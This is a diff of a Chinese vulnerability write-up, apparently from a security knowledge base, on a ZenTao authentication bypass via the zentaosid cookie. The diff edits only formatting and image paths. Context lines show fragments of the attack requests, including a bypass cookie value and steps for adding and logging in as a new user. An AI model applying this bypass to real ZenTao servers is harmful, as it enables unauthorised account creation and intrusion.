@@ -6,8 +6,8 @@
 
 参考链接：
 
-- https://www.zentao.net/book/zentaoprohelp/41.html
-- https://www.zentao.net/book/zentaopms/405.html
+* https://www.zentao.net/book/zentaoprohelp/41.html
+* https://www.zentao.net/book/zentaopms/405.html
 
 ## 漏洞影响
 
@@ -56,7 +56,7 @@ Content-Length: 11
 fields=true
 ```
 
-![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140408978.png)
+![](../.gitbook/assets/image-20250407140408978.png)
 
 未添加 `zentaosid` 时，访问 `/api.php/v1/users` 提示 `{"error":"Unauthorized"}`：
 
@@ -70,7 +70,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Content-Length: 11
 ```
 
-![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140530510.png)
+![](../.gitbook/assets/image-20250407140530510.png)
 
 添加 `zentaosid` 绕过认证：
 
@@ -85,7 +85,7 @@ Cookie: zentaosid=bdfda9cd81c43017703931d473ccca98;
 Content-Length: 11
 ```
 
-![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140639400.png)
+![](../.gitbook/assets/image-20250407140639400.png)
 
 通过该漏洞添加用户：
 
@@ -109,11 +109,11 @@ Content-Length: 11
 
 ```
 
-![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140215609.png)
+![](../.gitbook/assets/image-20250407140215609.png)
 
 使用添加的账号 `threeki/thr33..` 成功登录：
 
-![](images/禅道%20zentaosid%20cookie%20身份认证绕过漏洞/image-20250407140843200.png)
+![](../.gitbook/assets/image-20250407140843200.png)
 
 ## 漏洞修复
 
